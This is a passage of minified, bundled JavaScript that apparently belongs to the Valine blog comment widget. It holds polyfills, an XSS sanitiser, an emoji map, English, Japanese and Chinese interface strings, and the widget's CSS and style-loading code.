r=Object.prototype.hasOwnProperty,o=Object.prototype.toString,i=t(19),s=Object.prototype.propertyIsEnumerable,l=!s.call({toString:null},"toString"),c=s.call((function(){}),"prototype"),p=["toString","toLocaleString","valueOf","hasOwnProperty","isPrototypeOf","propertyIsEnumerable","constructor"],d=function(n){var e=n.constructor;return e&&e.prototype===n},u={$applicationCache:!0,$console:!0,$external:!0,$frame:!0,$frameElement:!0,$frames:!0,$innerHeight:!0,$innerWidth:!0,$onmozfullscreenchange:!0,$onmozfullscreenerror:!0,$outerHeight:!0,$outerWidth:!0,$pageXOffset:!0,$pageYOffset:!0,$parent:!0,$scrollLeft:!0,$scrollTop:!0,$scrollX:!0,$scrollY:!0,$self:!0,$webkitIndexedDB:!0,$webkitStorageInfo:!0,$window:!0},m=function(){if("undefined"==typeof window)return!1;for(var n in window)try{if(!u["$"+n]&&r.call(window,n)&&null!==window[n]&&"object"==typeof window[n])try{d(window[n])}catch(n){return!0}}catch(n){return!0}return!1}(),h=function(n){if("undefined"==typeof window||!m)return d(n);try{return d(n)}catch(n){return!1}};a=function(n){var e=null!==n&&"object"==typeof n,t="[object Function]"===o.call(n),a=i(n),s=e&&"[object String]"===o.call(n),d=[];if(!e&&!t&&!a)throw new TypeError("Object.keys called on a non-object");var u=c&&t;if(s&&n.length>0&&!r.call(n,0))for(var m=0;m<n.length;++m)d.push(String(m));if(a&&n.length>0)for(var g=0;g<n.length;++g)d.push(String(g));else for(var f in n)u&&"prototype"===f||!r.call(n,f)||d.push(String(f));if(l)for(var b=h(n),v=0;v<p.length;++v)b&&"constructor"===p[v]||!r.call(n,p[v])||d.push(p[v]);return d}}n.exports=a},function(n,e,t){"use strict";var a=Array.prototype.slice,r=t(19),o=Object.keys,i=o?function(n){return o(n)}:t(55),s=Object.keys;i.shim=function(){return Object.keys?function(){var n=Object.keys(arguments);return n&&n.length===arguments.length}(1,2)||(Object.keys=function(n){return s(r(n)?a.call(n):n)}):Object.keys=i,Object.keys||i},n.exports=i},function(n,e,t){"use strict";var a=t(14),r=t(10),o=t(20),i=t(21),s=t(58),l=r(i(),Object);a(l,{getPolyfill:i,implementation:o,shim:s}),n.exports=l},function(n,e,t){"use strict";var a=t(21),r=t(14);n.exports=function(){var n=a();return r(Object,{entries:n},{entries:function(){return Object.entries!==n}}),n}},function(n,e){function t(){throw new Error("setTimeout has not been defined")}function a(){throw new Error("clearTimeout has not been defined")}function r(n){if(c===setTimeout)return setTimeout(n,0);if((c===t||!c)&&setTimeout)return c=setTimeout,setTimeout(n,0);try{return c(n,0)}catch(e){try{return c.call(null,n,0)}catch(e){return c.call(this,n,0)}}}function o(){h&&u&&(h=!1,u.length?m=u.concat(m):g=-1,m.length&&i())}function i(){if(!h){var n=r(o);h=!0;for(var e=m.length;e;){for(u=m,m=[];++g<e;)u&&u[g].run();g=-1,e=m.length}u=null,h=!1,function(n){if(p===clearTimeout)return clearTimeout(n);if((p===a||!p)&&clearTimeout)return p=clearTimeout,clearTimeout(n);try{p(n)}catch(e){try{return p.call(null,n)}catch(e){return p.call(this,n)}}}(n)}}function s(n,e){this.fun=n,this.array=e}function l(){}var c,p,d=n.exports={};!function(){try{c="function"==typeof setTimeout?setTimeout:t}catch(n){c=t}try{p="function"==typeof clearTimeout?clearTimeout:a}catch(n){p=a}}();var u,m=[],h=!1,g=-1;d.nextTick=function(n){var e=new Array(arguments.length-1);if(arguments.length>1)for(var t=1;t<arguments.length;t++)e[t-1]=arguments[t];m.push(new s(n,e)),1!==m.length||h||r(i)},s.prototype.run=function(){this.fun.apply(null,this.array)},d.title="browser",d.browser=!0,d.env={},d.argv=[],d.version="",d.versions={},d.on=l,d.addListener=l,d.once=l,d.off=l,d.removeListener=l,d.removeAllListeners=l,d.emit=l,d.prependListener=l,d.prependOnceListener=l,d.listeners=function(n){return[]},d.binding=function(n){throw new Error("process.binding is not supported")},d.cwd=function(){return"/"},d.chdir=function(n){throw new Error("process.chdir is not supported")},d.umask=function(){return 0}},function(n,e,t){"use strict";var a=t(1),r=t(13),o=t(17)(),i=t(16),s=t(0),l=a("%Math.floor%");n.exports=function(n,e){if("function"!=typeof n)throw new s("`fn` is not a function");if("number"!=typeof e||e<0||e>4294967295||l(e)!==e)throw new s("`length` must be a positive 32-bit integer");var t=arguments.length>2&&!!arguments[2],a=!0,c=!0;if("length"in n&&i){var p=i(n,"length");p&&!p.configurable&&(a=!1),p&&!p.writable&&(c=!1)}return(a||c||!t)&&(o?r(n,"length",e,!0,!0):r(n,"length",e)),n}},function(n,e,t){"use strict";(function(e){var t=function(){};if("production"!==e.env.NODE_ENV){var a=function(n,e){var t=arguments.length;e=new Array(t>1?t-1:0);for(var a=1;a<t;a++)e[a-1]=arguments[a];var r=0,o="Warning: "+n.replace(/%s/g,(function(){return e[r++]}));try{throw new Error(o)}catch(n){}};t=function(n,e,t){var r=arguments.length;t=new Array(r>2?r-2:0);for(var o=2;o<r;o++)t[o-2]=arguments[o];if(void 0===e)throw new Error("`warning(condition, format, ...args)` requires a warning message argument");n||a.apply(null,[e].concat(t))}}n.exports=t}).call(e,t(59))},function(n,e,t){function a(n,e){return new i(e).process(n)}var r=t(22),o=t(23),i=t(63);(e=n.exports=a).filterXSS=a,e.FilterXSS=i,function(){for(var n in r)e[n]=r[n];for(var t in o)e[t]=o[t]}(),"undefined"!=typeof window&&(window.filterXSS=n.exports),"undefined"!=typeof self&&"undefined"!=typeof DedicatedWorkerGlobalScope&&self instanceof DedicatedWorkerGlobalScope&&(self.filterXSS=n.exports)},function(n,e,t){function a(n){return null==n}function r(n){(n=function(n){var e={};for(var t in n)e[t]=n[t];return e}(n||{})).stripIgnoreTag&&(n.onIgnoreTag,n.onIgnoreTag=i.onIgnoreTagStripAll),n.whiteList||n.allowList?n.whiteList=function(n){var e={};for(var t in n)Array.isArray(n[t])?e[t.toLowerCase()]=n[t].map((function(n){return n.toLowerCase()})):e[t.toLowerCase()]=n[t];return e}(n.whiteList||n.allowList):n.whiteList=i.whiteList,this.attributeWrapSign=!0===n.singleQuotedAttributeValue?"'":i.attributeWrapSign,n.onTag=n.onTag||i.onTag,n.onTagAttr=n.onTagAttr||i.onTagAttr,n.onIgnoreTag=n.onIgnoreTag||i.onIgnoreTag,n.onIgnoreTagAttr=n.onIgnoreTagAttr||i.onIgnoreTagAttr,n.safeAttrValue=n.safeAttrValue||i.safeAttrValue,n.escapeHtml=n.escapeHtml||i.escapeHtml,this.options=n,!1===n.css?this.cssFilter=!1:(n.css=n.css||{},this.cssFilter=new o(n.css))}var o=t(4).FilterCSS,i=t(22),s=t(23),l=s.parseTag,c=s.parseAttr,p=t(7);r.prototype.process=function(n){if(!(n=(n=n||"").toString()))return"";var e=this,t=e.options,r=t.whiteList,o=t.onTag,s=t.onIgnoreTag,d=t.onTagAttr,u=t.onIgnoreTagAttr,m=t.safeAttrValue,h=t.escapeHtml,g=e.attributeWrapSign,f=e.cssFilter;t.stripBlankChar&&(n=i.stripBlankChar(n)),t.allowCommentTag||(n=i.stripCommentTag(n));var b=!1;t.stripIgnoreTagBody&&(b=i.StripTagBody(t.stripIgnoreTagBody,s),s=b.onIgnoreTag);var v=l(n,(function(n,e,t,i,l){var b={sourcePosition:n,position:e,isClosing:l,isWhite:Object.prototype.hasOwnProperty.call(r,t)},v=o(t,i,b);if(!a(v))return v;if(b.isWhite){if(b.isClosing)return"</"+t+">";var y=function(n){var e=p.spaceIndex(n);if(-1===e)return{html:"",closing:"/"===n[n.length-2]};var t="/"===(n=p.trim(n.slice(e+1,-1)))[n.length-1];return t&&(n=p.trim(n.slice(0,-1))),{html:n,closing:t}}(i),x=r[t],w=c(y.html,(function(n,e){var r=-1!==p.indexOf(x,n),o=d(t,n,e,r);return a(o)?r?(e=m(t,n,e,f))?n+"="+g+e+g:n:a(o=u(t,n,e,r))?void 0:o:o}));return i="<"+t,w&&(i+=" "+w),y.closing&&(i+=" /"),i+">"}return a(v=s(t,i,b))?h(i):v}),h);return b&&(v=b.remove(v)),v},n.exports=r},function(n,e){n.exports={smile:"e3/2018new_weixioa02_org.png",lovely:"09/2018new_keai_org.png",happy:"1e/2018new_taikaixin_org.png",clap:"6e/2018new_guzhang_thumb.png",whee:"33/2018new_xixi_thumb.png",haha:"8f/2018new_haha_thumb.png","laugh and cry":"4a/2018new_xiaoku_thumb.png",wink:"43/2018new_jiyan_org.png",greddy:"fa/2018new_chanzui_org.png",awkward:"a3/2018new_heixian_thumb.png",sweat:"28/2018new_han_org.png","pick nose":"9a/2018new_wabi_thumb.png",hum:"7c/2018new_heng_thumb.png",angry:"f6/2018new_nu_thumb.png",grievance:"a5/2018new_weiqu_thumb.png",poor:"96/2018new_kelian_org.png",disappoint:"aa/2018new_shiwang_thumb.png",sad:"ee/2018new_beishang_org.png",tear:"6e/2018new_leimu_org.png","no way":"83/2018new_kuxiao_org.png",shy:"c1/2018new_haixiu_org.png",dirt:"10/2018new_wu_thumb.png","love you":"f6/2018new_aini_org.png",kiss:"2c/2018new_qinqin_thumb.png",amorousness:"9d/2018new_huaxin_org.png",longing:"c9/2018new_chongjing_org.png",desire:"3e/2018new_tianping_thumb.png","bad laugh":"4d/2018new_huaixiao_org.png",blackness:"9e/2018new_yinxian_org.png","laugh without word":"2d/2018new_xiaoerbuyu_org.png",titter:"71/2018new_touxiao_org.png",cool:"c4/2018new_ku_org.png","not easy":"aa/2018new_bingbujiandan_thumb.png",think:"30/2018new_sikao_org.png",question:"b8/2018new_ningwen_org.png","no idea":"2a/2018new_wenhao_thumb.png",dizzy:"07/2018new_yun_thumb.png",bomb:"a2/2018new_shuai_thumb.png",bone:"a1/2018new_kulou_thumb.png","be quiet":"b0/2018new_xu_org.png","shut up":"62/2018new_bizui_org.png",stupid:"dd/2018new_shayan_org.png","surprise ":"49/2018new_chijing_org.png",vomit:"08/2018new_tu_org.png",cold:"40/2018new_kouzhao_thumb.png",sick:"3b/2018new_shengbing_thumb.png",bye:"fd/2018new_baibai_thumb.png","look down on":"da/2018new_bishi_org.png","white eye":"ef/2018new_landelini_org.png","left hum":"43/2018new_zuohengheng_thumb.png","right hum":"c1/2018new_youhengheng_thumb.png",crazy:"17/2018new_zhuakuang_org.png","scold ":"87/2018new_zhouma_thumb.png","hit on face":"cb/2018new_dalian_org.png",wow:"ae/2018new_ding_org.png",fan:"86/2018new_hufen02_org.png",money:"a2/2018new_qian_thumb.png",yawn:"55/2018new_dahaqian_org.png",sleepy:"3c/2018new_kun_thumb.png",sleep:"e2/2018new_shuijiao_thumb.png","watermelon ":"01/2018new_chigua_thumb.png",doge:"a1/2018new_doge02_org.png",dog:"22/2018new_erha_org.png",cat:"7b/2018new_miaomiao_thumb.png",thumb:"e6/2018new_zan_org.png",good:"8a/2018new_good_org.png",ok:"45/2018new_ok_org.png",yeah:"29/2018new_ye_thumb.png","shack hand":"e9/2018new_woshou_thumb.png",bow:"e7/2018new_zuoyi_org.png",come:"42/2018new_guolai_thumb.png",punch:"86/2018new_quantou_thumb.png"}},function(n,e){n.exports={nick:"NickName",mail:"E-Mail",link:"Website(http://)",nickFail:"NickName cannot be less than 3 bytes.",mailFail:"Please confirm your email address.",sofa:"No comment yet.",submit:"Submit",reply:"Reply",cancelReply:"Cancel reply",comments:"Comments",cancel:"Cancel",confirm:"Confirm",continue:"Continue",more:"Load More...",preview:"Preview",emoji:"Emoji",expand:"See more....",seconds:"seconds ago",minutes:"minutes ago",hours:"hours ago",days:"days ago",now:"just now",uploading:"Uploading ...",uploadDone:"Upload completed!",busy:"Submit is busy, please wait...","code-98":"Valine initialization failed, please check your version of av-min.js.","code-99":"Valine initialization failed, Please check the `el` element in the init method.","code-100":"Valine initialization failed, Please check your appId and appKey.","code-140":"The total number of API calls today has exceeded the development version limit.","code-401":"Unauthorized operation, Please check your appId and appKey.","code-403":"Access denied by API domain white list, Please check your security domain."}},function(n,e){n.exports={nick:"ニックネーム",mail:"メールアドレス",link:"サイト(http://)",nickFail:"3バイト以上のニックネームをご入力ください.",mailFail:"メールアドレスをご確認ください.",sofa:"コメントしましょう~",submit:"提出する",reply:"返信する",cancelReply:"キャンセル",comments:"コメント",cancel:"キャンセル",confirm:"確認する",continue:"继续",more:"さらに読み込む...",preview:"プレビュー",emoji:"絵文字",expand:"もっと見る",seconds:"秒前",minutes:"分前",hours:"時間前",days:"日前",now:"たっだ今",uploading:"アップロード中...",uploadDone:"アップロードが完了しました!",busy:"20 秒間隔で提出してください    ...","code-98":"ロードエラーです。av-min.js のバージョンを確認してください.","code-99":"ロードエラーです。initにある`el`エレメントを確認ください.","code-100":"ロードエラーです。AppIdとAppKeyを確認ください.","code-140":"今日のAPIコールの総数が開発バージョンの上限を超えた.","code-401":"権限が制限されています。AppIdとAppKeyを確認ください.","code-403":"アクセスがAPIなどに制限されました、ドメイン名のセキュリティ設定を確認ください"}},function(n,e){n.exports={nick:"昵称",mail:"邮箱",link:"网址(http://)",nickFail:"昵称不能少于3个字符",mailFail:"请填写正确的邮件地址",sofa:"来发评论吧~",submit:"提交",reply:"回复",cancelReply:"取消回复",comments:"评论",cancel:"取消",confirm:"确认",continue:"继续",more:"加载更多...",preview:"预览",emoji:"表情",expand:"查看更多...",seconds:"秒前",minutes:"分钟前",hours:"小时前",days:"天前",now:"刚刚",uploading:"正在传输...",uploadDone:"传输完成!",busy:"操作频繁，请稍候再试...","code-98":"Valine 初始化失败，请检查 av-min.js 版本","code-99":"Valine 初始化失败，请检查init中的`el`元素.","code-100":"Valine 初始化失败，请检查你的AppId和AppKey.","code-140":"今日 API 调用总次数已超过开发版限制.","code-401":"未经授权的操作，请检查你的AppId和AppKey.","code-403":"访问被API域名白名单拒绝，请检查你的安全域名设置."}},function(n,e){n.exports={nick:"暱稱",mail:"郵箱",link:"網址(http://)",nickFail:"昵稱不能少於3個字符",mailFail:"請填寫正確的郵件地址",sofa:"來發評論吧~",submit:"提交",reply:"回覆",cancelReply:"取消回覆",comments:"評論",cancel:"取消",confirm:"確認",continue:"繼續",more:"加載更多...",preview:"預覽",emoji:"表情",expand:"查看更多...",seconds:"秒前",minutes:"分鐘前",hours:"小時前",days:"天前",now:"剛剛",uploading:"正在上傳...",uploadDone:"上傳完成!",busy:"操作頻繁，請稍候再試...","code-98":"Valine 初始化失敗，請檢查 av-min.js 版本","code-99":"Valine 初始化失敗，請檢查init中的`el`元素.","code-100":"Valine 初始化失敗，請檢查你的AppId和AppKey.","code-140":"今日 API 調用總次數已超過開發版限制.","code-401":"未經授權的操作，請檢查你的AppId和AppKey.","code-403":"訪問被API域名白名單拒絕，請檢查你的安全域名設置."}},function(n,e,t){var a=t(70);"string"==typeof a&&(a=[[n.i,a,""]]);var r={transform:void 0};t(72)(a,r),a.locals&&(n.exports=a.locals)},function(n,e,t){(e=t(71)(!1)).push([n.i,'.v[data-class=v]{font-size:16px;text-align:left}.v[data-class=v] *{-webkit-box-sizing:border-box;box-sizing:border-box;line-height:1.75}.v[data-class=v] .vinput,.v[data-class=v] .veditor,.v[data-class=v] p,.v[data-class=v] pre code,.v[data-class=v] .status-bar{color:#555}.v[data-class=v] .vtime,.v[data-class=v] .vsys{color:#b3b3b3}.v[data-class=v] .text-right{text-align:right}.v[data-class=v] .text-center{text-align:center}.v[data-class=v] img{max-width:100%;border:none}.v[data-class=v] hr{margin:.825em 0;border-color:#f6f6f6;border-style:dashed}.v[data-class=v].hide-avatar .vimg{display:none}.v[data-class=v] a{position:relative;cursor:pointer;color:#1abc9c;text-decoration:none;display:inline-block}.v[data-class=v] a:hover{color:#d7191a}.v[data-class=v] pre,.v[data-class=v] code{background-color:#f8f8f8;padding:.2em .4em;border-radius:3px;font-size:85%;margin:0}.v[data-class=v] pre{padding:10px;overflow:auto;line-height:1.45}.v[data-class=v] pre code{padding:0;background:rgba(0,0,0,0);white-space:pre-wrap;word-break:keep-all}.v[data-class=v] blockquote{color:#666;margin:.5em 0;padding:0 0 0 1em;border-left:8px solid rgba(238,238,238,.5)}.v[data-class=v] .vinput{border:none;resize:none;outline:none;padding:10px 5px;max-width:100%;font-size:.775em;-webkit-box-sizing:border-box;box-sizing:border-box}.v[data-class=v] input[type=checkbox],.v[data-class=v] input[type=radio]{display:inline-block;vertical-align:middle;margin-top:-2px}.v[data-class=v] .vicon{cursor:pointer;display:inline-block;overflow:hidden;fill:#555;vertical-align:middle}.v[data-class=v] .vicon+.vicon{margin-left:10px}.v[data-class=v] .vicon.actived{fill:#66b1ff}.v[data-class=v] .vrow{font-size:0;padding:10px 0}.v[data-class=v] .vrow .vcol{display:inline-block;vertical-align:middle;font-size:14px}.v[data-class=v] .vrow .vcol.vcol-20{width:20%}.v[data-class=v] .vrow .vcol.vcol-30{width:30%}.v[data-class=v] .vrow .vcol.vcol-40{width:40%}.v[data-class=v] .vrow .vcol.vcol-50{width:50%}.v[data-class=v] .vrow .vcol.vcol-60{width:60%}.v[data-class=v] .vrow .vcol.vcol-70{width:70%}.v[data-class=v] .vrow .vcol.vcol-80{width:80%}.v[data-class=v] .vrow .vcol.vctrl{font-size:12px}.v[data-class=v] .vemoji,.v[data-class=v] .emoji{width:26px;height:26px;overflow:hidden;vertical-align:middle;margin:0 1px;display:inline-block}.v[data-class=v] .vwrap{border:1px solid #f0f0f0;border-radius:4px;margin-bottom:10px;overflow:hidden;position:relative;padding:10px}.v[data-class=v] .vwrap input{background:rgba(0,0,0,0)}.v[data-class=v] .vwrap .vedit{position:relative;padding-top:10px}.v[data-class=v] .vwrap .cancel-reply-btn{position:absolute;right:5px;top:5px;cursor:pointer}.v[data-class=v] .vwrap .vemojis{display:none;font-size:18px;max-height:145px;overflow:auto;padding-bottom:10px;-webkit-box-shadow:0px 0 1px #f0f0f0;box-shadow:0px 0 1px #f0f0f0}.v[data-class=v] .vwrap .vemojis i{font-style:normal;padding-top:7px;width:36px;cursor:pointer;text-align:center;display:inline-block;vertical-align:middle}.v[data-class=v] .vwrap .vpreview{padding:7px;-webkit-box-shadow:0px 0 1px #f0f0f0;box-shadow:0px 0 1px #f0f0f0}.v[data-class=v] .vwrap .vheader .vinput{width:33.33%;border-bottom:1px #dedede dashed}.v[data-class=v] .vwrap .vheader.item2 .vinput{width:50%}.v[data-class=v] .vwrap .vheader.item1 .vinput{width:100%}.v[data-class=v] .vwrap .vheader .vinput:focus{border-bottom-color:#eb5055}@media screen and (max-width: 520px){.v[data-class=v] .vwrap .vheader .vinput{width:100%}.v[data-class=v] .vwrap .vheader.item2 .vinput{width:100%}}.v[data-class=v] .vpower{color:#999;font-size:.75em;padding:.5em 0}.v[data-class=v] .vpower a{font-size:.75em}.v[data-class=v] .vcount{padding:5px;font-weight:600;font-size:1.25em}.v[data-class=v] ul,.v[data-class=v] ol{padding:0;margin-left:1.25em}.v[data-class=v] .txt-center{text-align:center}.v[data-class=v] .txt-right{text-align:right}.v[data-class=v] .veditor{width:100%;min-height:8.75em;font-size:.875em;background:rgba(0,0,0,0);resize:vertical;-webkit-transition:all .25s ease;transition:all .25s ease}.v[data-class=v] .vbtn{-webkit-transition-duration:.4s;transition-duration:.4s;text-align:center;color:#555;border:1px solid #ededed;border-radius:.3em;display:inline-block;background:rgba(0,0,0,0);margin-bottom:0;font-weight:400;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;white-space:nowrap;padding:.5em 1.25em;font-size:.875em;line-height:1.42857143;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;outline:none}.v[data-class=v] .vbtn+.vbtn{margin-left:1.25em}.v[data-class=v] .vbtn:active,.v[data-class=v] .vbtn:hover{color:#3090e4;border-color:#3090e4}.v[data-class=v] .vbtn:disabled{border-color:#e1e1e1;color:#e1e1e1;background-color:#fdfafa;cursor:not-allowed}.v[data-class=v] .vempty{padding:1.25em;text-align:center;color:#555;overflow:auto}.v[data-class=v] .vsys{display:inline-block;padding:.2em .5em;font-size:.75em;border-radius:.2em;margin-right:.3em}@media screen and (max-width: 520px){.v[data-class=v] .vsys{display:none}}.v[data-class=v] .vcards{width:100%}.v[data-class=v] .vcards .vcard{padding-top:1.25em;position:relative;display:block}.v[data-class=v] .vcards .vcard:after{content:"";clear:both;display:block}.v[data-class=v] .vcards .vcard .vimg{width:3.125em;height:3.125em;float:left;border-radius:50%;margin-right:.7525em;border:1px solid #f5f5f5;padding:.125em}@media screen and (max-width: 720px){.v[data-class=v] .vcards .vcard .vimg{width:2.5em;height:2.5em}}.v[data-class=v] .vcards .vcard .vhead{line-height:1.5;margin-top:0}.v[data-class=v] .vcards .vcard .vhead .vnick{position:relative;font-size:.875em;font-weight:500;margin-right:.875em;cursor:pointer;text-decoration:none;display:inline-block}.v[data-class=v] .vcards .vcard .vhead .vnick:hover{color:#d7191a}.v[data-class=v] .vcards .vcard .vh{overflow:hidden;padding-bottom:.5em;border-bottom:1px dashed #f5f5f5}.v[data-class=v] .vcards .vcard .vh .vtime{font-size:.75em;margin-right:.875em}.v[data-class=v] .vcards .vcard .vh .vmeta{line-height:1;position:relative}.v[data-class=v] .vcards .vcard .vh .vmeta .vat{font-size:.8125em;color:#ef2f11;cursor:pointer;float:right}.v[data-class=v] .vcards .vcard:last-child .vh{border-bottom:none}.v[data-class=v] .vcards .vcard .vcontent{word-wrap:break-word;word-break:break-all;font-size:.875em;line-height:2;position:relative;margin-bottom:.75em;padding-top:.625em}.v[data-class=v] .vcards .vcard .vcontent.expand{cursor:pointer;max-height:8em;overflow:hidden}.v[data-class=v] .vcards .vcard .vcontent.expand::before{display:block;content:"";position:absolute;width:100%;left:0;top:0;bottom:3.15em;background:-webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(rgba(255, 255, 255, 0.9)));background:linear-gradient(180deg, rgba(255, 255, 255, 0), rgba(255, 255, 255, 0.9));z-index:999}.v[data-class=v] .vcards .vcard .vcontent.expand::after{display:block;content:attr(data-expand);text-align:center;color:#828586;position:absolute;width:100%;height:3.15em;line-height:3.15em;left:0;bottom:0;z-index:999;background:rgba(255,255,255,.9)}.v[data-class=v] .vcards .vcard .vquote{padding-left:1em;border-left:1px dashed rgba(238,238,238,.5)}.v[data-class=v] .vcards .vcard .vquote .vimg{width:2.225em;height:2.225em}.v[data-class=v] .vpage .vmore{margin:1em 0}.v[data-class=v] .clear{content:"";display:block;clear:both}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes pulse{50%{background:#dcdcdc}}@keyframes pulse{50%{background:#dcdcdc}}.v[data-class=v] .vspinner{width:22px;height:22px;display:inline-block;border:6px double #a0a0a0;border-top-color:rgba(0,0,0,0);border-bottom-color:rgba(0,0,0,0);border-radius:50%;-webkit-animation:spin 1s infinite linear;animation:spin 1s infinite linear;position:relative;vertical-align:middle;margin:0 5px}[data-theme=dark] .v[data-class=v] .vinput,[data-theme=dark] .v[data-class=v] .veditor,[data-theme=dark] .v[data-class=v] p,[data-theme=dark] .v[data-class=v] pre code,[data-theme=dark] .v[data-class=v] .status-bar,.dark .v[data-class=v] .vinput,.dark .v[data-class=v] .veditor,.dark .v[data-class=v] p,.dark .v[data-class=v] pre code,.dark .v[data-class=v] .status-bar,.theme__dark .v[data-class=v] .vinput,.theme__dark .v[data-class=v] .veditor,.theme__dark .v[data-class=v] p,.theme__dark .v[data-class=v] pre code,.theme__dark .v[data-class=v] .status-bar,.night .v[data-class=v] .vinput,.night .v[data-class=v] .veditor,.night .v[data-class=v] p,.night .v[data-class=v] pre code,.night .v[data-class=v] .status-bar{color:#b2b2b5}[data-theme=dark] .v[data-class=v] .vtime,[data-theme=dark] .v[data-class=v] .vsys,.dark .v[data-class=v] .vtime,.dark .v[data-class=v] .vsys,.theme__dark .v[data-class=v] .vtime,.theme__dark .v[data-class=v] .vsys,.night .v[data-class=v] .vtime,.night .v[data-class=v] .vsys{color:#929298}[data-theme=dark] .v[data-class=v] pre,[data-theme=dark] .v[data-class=v] code,[data-theme=dark] .v[data-class=v] pre code,.dark .v[data-class=v] pre,.dark .v[data-class=v] code,.dark .v[data-class=v] pre code,.theme__dark .v[data-class=v] pre,.theme__dark .v[data-class=v] code,.theme__dark .v[data-class=v] pre code,.night .v[data-class=v] pre,.night .v[data-class=v] code,.night .v[data-class=v] pre code{color:#929298;background-color:#151414}[data-theme=dark] .v[data-class=v] .vwrap,.dark .v[data-class=v] .vwrap,.theme__dark .v[data-class=v] .vwrap,.night .v[data-class=v] .vwrap{border-color:#b2b2b5}[data-theme=dark] .v[data-class=v] .vicon,.dark .v[data-class=v] .vicon,.theme__dark .v[data-class=v] .vicon,.night .v[data-class=v] .vicon{fill:#b2b2b5}[data-theme=dark] .v[data-class=v] .vicon.actived,.dark .v[data-class=v] .vicon.actived,.theme__dark .v[data-class=v] .vicon.actived,.night .v[data-class=v] .vicon.actived{fill:#66b1ff}[data-theme=dark] .v[data-class=v] .vbtn,.dark .v[data-class=v] .vbtn,.theme__dark .v[data-class=v] .vbtn,.night .v[data-class=v] .vbtn{color:#b2b2b5;border-color:#b2b2b5}[data-theme=dark] .v[data-class=v] .vbtn:hover,.dark .v[data-class=v] .vbtn:hover,.theme__dark .v[data-class=v] .vbtn:hover,.night .v[data-class=v] .vbtn:hover{color:#66b1ff;border-color:#66b1ff}[data-theme=dark] .v[data-class=v] a:hover,.dark .v[data-class=v] a:hover,.theme__dark .v[data-class=v] a:hover,.night .v[data-class=v] a:hover{color:#d7191a}[data-theme=dark] .v[data-class=v] .vcards .vcard .vcontent.expand::before,.dark .v[data-class=v] .vcards .vcard .vcontent.expand::before,.theme__dark .v[data-class=v] .vcards .vcard .vcontent.expand::before,.night .v[data-class=v] .vcards .vcard .vcontent.expand::before{background:-webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, 0.3)), to(rgba(0, 0, 0, 0.7)));background:linear-gradient(180deg, rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.7))}[data-theme=dark] .v[data-class=v] .vcards .vcard .vcontent.expand::after,.dark .v[data-class=v] .vcards .vcard .vcontent.expand::after,.theme__dark .v[data-class=v] .vcards .vcard .vcontent.expand::after,.night .v[data-class=v] .vcards .vcard .vcontent.expand::after{background:rgba(0,0,0,.7)}@media(prefers-color-scheme: dark){.v[data-class=v] .vinput,.v[data-class=v] .veditor,.v[data-class=v] p,.v[data-class=v] pre code,.v[data-class=v] .status-bar{color:#b2b2b5}.v[data-class=v] .vtime,.v[data-class=v] .vsys{color:#929298}.v[data-class=v] pre,.v[data-class=v] code,.v[data-class=v] pre code{color:#929298;background-color:#151414}.v[data-class=v] .vwrap{border-color:#b2b2b5}.v[data-class=v] .vicon{fill:#b2b2b5}.v[data-class=v] .vicon.actived{fill:#66b1ff}.v[data-class=v] .vbtn{color:#b2b2b5;border-color:#b2b2b5}.v[data-class=v] .vbtn:hover{color:#66b1ff;border-color:#66b1ff}.v[data-class=v] a:hover{color:#d7191a}.v[data-class=v] .vcards .vcard .vcontent.expand::before{background:-webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, 0.3)), to(rgba(0, 0, 0, 0.7)));background:linear-gradient(180deg, rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.7))}.v[data-class=v] .vcards .vcard .vcontent.expand::after{background:rgba(0,0,0,.7)}}',""]),n.exports=e},function(n,e,t){"use strict";function a(n,e){var t=n[1]||"",a=n[3];if(!a)return t;if(e&&"function"==typeof btoa){var r=function(n){return"/*# ".concat("sourceMappingURL=data:application/json;charset=utf-8;base64,".concat(btoa(unescape(encodeURIComponent(JSON.stringify(n)))))," */")}(a);return[t].concat(a.sources.map((function(n){return"/*# sourceURL=".concat(a.sourceRoot||"").concat(n," */")}))).concat([r]).join("\n")}return[t].join("\n")}n.exports=function(n){var e=[];return e.toString=function(){return this.map((function(e){var t=a(e,n);return e[2]?"@media ".concat(e[2]," {").concat(t,"}"):t})).join("")},e.i=function(n,t,a){"string"==typeof n&&(n=[[null,n,""]]);var r={};if(a)for(var o=0;o<this.length;o++){var i=this[o][0];null!=i&&(r[i]=!0)}for(var s=0;s<n.length;s++){var l=[].concat(n[s]);a&&r[l[0]]||(t&&(l[2]?l[2]="".concat(t," and ").concat(l[2]):l[2]=t),e.push(l))}},e}},function(n,e,t){function a(n,e){for(var t=0;t<n.length;t++){var a=n[t],r=h[a.id];if(r){r.refs++;for(var o=0;o<r.parts.length;o++)r.parts[o](a.parts[o]);for(;o<a.parts.length;o++)r.parts.push(p(a.parts[o],e))}else{var i=[];for(o=0;o<a.parts.length;o++)i.push(p(a.parts[o],e));h[a.id]={id:a.id,refs:1,parts:i}}}}function r(n,e){for(var t=[],a={},r=0;r<n.length;r++){var o=n[r],i=e.base?o[0]+e.base:o[0],s={css:o[1],media:o[2],sourceMap:o[3]};a[i]?a[i].parts.push(s):t.push(a[i]={id:i,parts:[s]})}return t}function o(n,e){var t=f(n.insertInto);if(!t)throw new Error("Couldn't find a style target. This probably means that the value for the 'insertInto' parameter is invalid.");var a=y[y.length-1];if("top"===n.insertAt)a?a.nextSibling?t.insertBefore(e,a.nextSibling):t.appendChild(e):t.insertBefore(e,t.firstChild),y.push(e);else{if("bottom"!==n.insertAt)throw new Error("Invalid value for parameter 'insertAt'. Must be 'top' or 'bottom'.");t.appendChild(e)}}function i(n){if(null===n.parentNode)return!1;n.parentNode.removeChild(n);var e=y.indexOf(n);e>=0&&y.splice(e,1)}function s(n){var e=document.createElement("style");return n.attrs.type="text/css",c(e,n.attrs),o(n,e),e}function l(n){var e=document.createElement("link");return 